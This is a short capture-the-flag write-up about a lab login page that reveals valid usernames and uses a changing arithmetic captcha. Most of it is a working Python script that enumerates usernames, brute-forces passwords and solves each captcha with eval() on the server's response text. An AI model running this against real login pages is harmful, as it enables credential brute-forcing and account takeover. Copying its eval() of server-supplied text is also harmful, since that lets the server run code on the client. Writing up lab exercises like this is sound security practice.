# Capture!

### Capture!
I am provided with a list of username and passwords. The problem is that I cannot bruteforce the login with those credentials.<br />
![image](https://github.com/user-attachments/assets/ec6592e9-74ad-4f20-a414-35fe37108709)<br />
Furthermore: <br />
![image](https://github.com/user-attachments/assets/9702c89b-13b3-41f0-9ea1-34e7e9b93995)<br />
The username "bruce" is on the list, but it's actually not a valid user. I want to know what are valid users from the list. But there's a problem:<br />
![image](https://github.com/user-attachments/assets/b4b0a6c0-cb4c-4a4f-bf0d-0b0ae92467ee)<br />
I cannot just use hydra because I first have to solve this captcha that changes at every request. But this can be automated with a python script. This script needs to perform the bruteforce attack, but every time it also needs to read the numbers, evaulate the espression and send the result along with the bruteforced credentials.<br />
The following python code automates all of this process to find the correct credentials, log in and get the flag:<br />

import requests, re

    #FILL THIS VARIABLE
    ip = ""
    url = f"http://{ip}/login"
    
    with open("usernames.txt", "rt") as fd:
            usernames = fd.read().splitlines()
    
    with open("passwords.txt", "rt") as fd:
            passwords = fd.read().splitlines()
    
    regex = re.compile(r"(\d+\s[+*/-]\s\d+)\s\=\s\?")
    
    def send_post(username, password, captcha=None):
            data = {
                    "username":username,
                    "password":password,
            }
            if captcha:
                    data.update({"captcha":captcha})
            response = requests.post(url=url, data=data)
            return response
    
    def solve_captcha(response):
        captcha = re.findall(regex, response.text)[0]
        return eval(captcha)
    
    for count in range(100):
            response = send_post("darthvader", "lukesfather")
            try:
                    captcha = solve_captcha(response)
                    print(f"Captcha synchronised! Next solution is: {captcha}")
                    break
            except:
                    pass
    
    for username in usernames:
                    response = send_post(username, "None", captcha)
                    captcha = solve_captcha(response)
                    if not "does not exist" in response.text:
                            for password in passwords:
                                    response = send_post(username, password, captcha)
                                    if not "Error" in response.text:
                                            print(f"Success! Username:{username} Password:{password}")
                                            exit(0)
                                    else:
                                            captcha = solve_captcha(response)

